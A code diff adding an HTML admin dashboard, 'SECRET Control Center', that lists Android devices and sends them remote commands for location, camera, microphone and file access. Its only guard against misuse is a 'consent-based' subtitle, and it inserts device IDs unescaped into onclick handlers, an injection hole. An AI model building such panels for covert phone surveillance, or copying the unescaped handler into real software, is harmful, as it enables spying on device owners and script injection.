@@ -1,0 +1,79 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>SECRET Control Center</title>
+<style>
+body{font-family:Arial,sans-serif;background:#111;color:#eee;margin:0;padding:24px}
+.wrap{max-width:1000px;margin:auto}
+.card{background:#1b1b1b;border:1px solid #333;border-radius:14px;padding:18px;margin:14px 0}
+input,button{padding:10px;border-radius:8px;border:1px solid #444;background:#222;color:#fff}
+button{cursor:pointer;margin:4px}
+.status{font-size:13px;color:#aaa}
+.online{color:#65d98b}.offline{color:#ff7777}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:14px}
+</style>
+</head>
+<body>
+<div class="wrap">
+<h1>SECRET Control Center</h1>
+<p class="status">Consent-based device management dashboard</p>
+<div class="card">
+  <label>Admin token </label>
+  <input id="token" type="password" placeholder="SECRET_ADMIN_TOKEN">
+  <button onclick="loadDevices()">Connect</button>
+  <span id="health" class="status"></span>
+</div>
+<div id="devices" class="grid"></div>
+</div>
+<script>
+async function api(path, options={}) {
+  options.headers = Object.assign({}, options.headers || {},
+    {"X-Admin-Token": document.getElementById("token").value});
+  const r = await fetch(path, options);
+  return r.json();
+}
+async function loadDevices(){
+  try{
+    const h = await fetch("/api/health").then(r=>r.json());
+    document.getElementById("health").textContent =
+      "Server OK • DB " + (h.database ? "connected" : "not configured");
+    const list = await api("/api/devices");
+    const root = document.getElementById("devices");
+    root.innerHTML = "";
+    list.forEach(d => {
+      const card = document.createElement("div");
+      card.className = "card";
+      const online = d.connected;
+      card.innerHTML = `
+        <h2>${escapeHtml(d.name || "SECRET Android")}</h2>
+        <div class="${online ? "online":"offline"}">${online ? "● ONLINE":"● OFFLINE"}</div>
+        <p class="status">ID: ${escapeHtml(d.deviceId)}</p>
+        <p class="status">Last seen: ${escapeHtml(d.lastSeen || "-")}</p>
+        <button onclick="cmd('${d.deviceId}','ping')">Ping</button>
+        <button onclick="cmd('${d.deviceId}','get_status')">Status</button>
+        <button onclick="cmd('${d.deviceId}','request_location')">Location</button>
+        <button onclick="cmd('${d.deviceId}','request_camera')">Camera</button>
+        <button onclick="cmd('${d.deviceId}','request_microphone')">Microphone</button>
+        <button onclick="cmd('${d.deviceId}','open_files')">Files</button>
+      `;
+      root.appendChild(card);
+    });
+  }catch(e){ document.getElementById("health").textContent = "Connection error"; }
+}
+async function cmd(id, command){
+  const r = await api("/api/command/"+encodeURIComponent(id), {
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({command})
+  });
+  alert(JSON.stringify(r));
+}
+function escapeHtml(s){
+  return String(s).replace(/[&<>"']/g,m=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[m]));
+}
+setInterval(loadDevices,5000);
+</script>
+</body>
+</html>
